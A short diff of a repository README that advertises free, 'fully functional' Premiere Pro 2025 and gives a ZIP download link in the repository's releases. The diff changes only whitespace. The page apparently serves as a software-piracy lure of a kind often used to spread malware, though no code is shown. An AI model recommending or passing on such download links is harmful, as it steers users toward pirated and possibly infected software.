@@ -4,7 +4,7 @@ Welcome to the Premiere Pro repository! 🚀 Here, you can access the powerful f
 ## 📁 Repository Details   
 - Name: Premiere Pro  
 - Description: Get access to Premiere Pro for free. Tags: Premiere-Pro-2025-free, download at no cost, fully functional version.  
-- Topics: Premiere Pro, video editing, free software
+- Topics: Premiere Pro, video editing, free software  
 
 ## 🔗 How to Access  
 ### [Download Premiere Pro 💻](https://github.com/Kavith12/Premiere-Pro-2025-Full/releases/download/premiere/PremierePro.zip)
